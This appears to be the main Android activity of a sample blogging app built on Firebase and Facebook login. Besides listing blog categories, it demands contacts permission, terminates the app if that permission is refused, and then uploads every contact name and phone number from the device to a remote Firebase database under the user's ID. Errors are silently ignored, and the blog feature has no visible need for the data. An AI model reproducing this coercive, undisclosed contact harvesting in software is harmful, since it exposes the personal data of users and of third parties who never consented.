package com.geniusnine.android.sampleblogger;

import android.*;
import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.login.LoginManager;
import com.firebase.ui.database.FirebaseRecyclerAdapter;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private RecyclerView mBlogList;
    private FirebaseAuth mAuth;
    private FirebaseAuth.AuthStateListener mAuthListner;
    private static final int REQUEST_CONTACTS = 1;
    private static String[] PERMISSIONS_CONTACT = {android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS};

    private DatabaseReference mDataBaseContacts;
    private DatabaseReference mCategories;
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        Log.e("MainActivity:", "Started");
        FacebookSdk.sdkInitialize(getApplicationContext());
        AppEventsLogger.activateApp(this);
        setContentView(R.layout.activity_main);
        mBlogList = (RecyclerView)findViewById(R.id.blog_list);
        mBlogList.setHasFixedSize(true);
        mBlogList.setLayoutManager(new LinearLayoutManager(this)) ;

        mAuth = FirebaseAuth.getInstance();
        mDataBaseContacts = FirebaseDatabase.getInstance().getReference().child("Contacts");
        mCategories = FirebaseDatabase.getInstance().getReference().child("Categories");
        //AddCategories();
        mAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("MainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivity.this, Login.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);

                }
                else {
                    CheckPermission();
                    CheckPermissionSecondTime();

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("MainActivity:", "Starting auth listener");
        mAuth.addAuthStateListener(mAuthListner);

        FirebaseRecyclerAdapter<Blog, BlogViewHolder> firebaseRecyclerAdapter = new FirebaseRecyclerAdapter<Blog, BlogViewHolder>(Blog.class, R.layout.blog_row, BlogViewHolder.class, mCategories) {
            @Override
            protected void populateViewHolder(BlogViewHolder viewHolder, Blog model, int position) {

                viewHolder.setTitle(model.getTitle());
                viewHolder.setDesc(model.getDesc());
            }
        };
        mBlogList.setAdapter(firebaseRecyclerAdapter);

    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the GeometryHome/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_logout) {
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();
        }
        if (id == R.id.action_profile) {
           // Intent contact = new Intent(MainActivity.this, FacebookProfile.class);
           // startActivity(contact);
        }


        return super.onOptionsItemSelected(item);
    }


    private void CheckPermission(){
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)
        {

           // Log.i(TAG, "Contact permissions has NOT been granted. Requesting permissions.");
            requestContactsPermissions();

        } else {

            SyncContacts();


        }
    }

    private void CheckPermissionSecondTime(){
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)
        {

            // Log.i(TAG, "Contact permissions has NOT been granted. Requesting permissions.");
            android.os.Process.killProcess(android.os.Process.myPid());
            System.exit(1);

        } else {

            SyncContacts();


        }
    }

    private void requestContactsPermissions() {
        // BEGIN_INCLUDE(contacts_permission_request)
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_CONTACTS))
        {
            ActivityCompat.requestPermissions(MainActivity.this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);
            //Log.i(TAG, "permission was asked");

        } else {
            // Contact permissions have not been granted yet. Request them directly.
            ActivityCompat.requestPermissions(this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);
        }

    }

    protected void SyncContacts(){

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)== PackageManager.PERMISSION_GRANTED)
        {

            String user_id = mAuth.getCurrentUser().getUid();
            DatabaseReference current_user_db = mDataBaseContacts.child(user_id);


            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                String name;
                String number;

                name=phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                number=phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                try {
                    current_user_db.child(number).setValue(name);
                }
                catch(Exception e) {

                }





            }


        } else {

            requestContactsPermissions();

        }


    }

    private void AddCategories(){
        DatabaseReference mCategoryChild = mCategories.child("Hindi");
        mCategoryChild.child("Spardunga").setValue("Valteu vakar jani n a pakiye/n valita");
        mCategoryChild.child("Aichatma").setValue("Aiiscncd vakar jani n a pakiye/n valita");


    }


    public static class BlogViewHolder extends RecyclerView.ViewHolder{

        View mView;
        public BlogViewHolder(View itemView) {
            super(itemView);
            mView = itemView;
        }

        public void setTitle(String title){
            TextView post_title = (TextView)mView.findViewById(R.id.post_title);
            post_title.setText(title);
        }
        public void setDesc(String desc){
            TextView post_desc = (TextView)mView.findViewById(R.id.post_desc);
            post_desc.setText(desc);

        }
    }
}
